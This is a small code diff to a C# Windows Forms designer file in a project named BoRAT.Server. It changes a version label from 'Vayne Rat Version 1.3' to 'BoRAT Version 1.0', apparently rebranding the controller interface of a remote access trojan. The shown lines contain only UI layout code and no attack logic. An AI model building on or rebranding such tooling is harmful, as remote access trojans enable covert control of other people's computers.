@@ -242,9 +242,9 @@ namespace BoRAT.Server
             this.lblVersion.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(43)))), ((int)(((byte)(183)))), ((int)(((byte)(96)))));
             this.lblVersion.Location = new System.Drawing.Point(382, 9);
             this.lblVersion.Name = "lblVersion";
-            this.lblVersion.Size = new System.Drawing.Size(133, 13);
+            this.lblVersion.Size = new System.Drawing.Size(112, 13);
             this.lblVersion.TabIndex = 2;
-            this.lblVersion.Text = "Vayne Rat Version 1.3";
+            this.lblVersion.Text = "BoRAT Version 1.0";
             this.lblVersion.MouseDown += new System.Windows.Forms.MouseEventHandler(this.lblVersion_MouseDown);
             // 
             // bunifuCustomLabel3
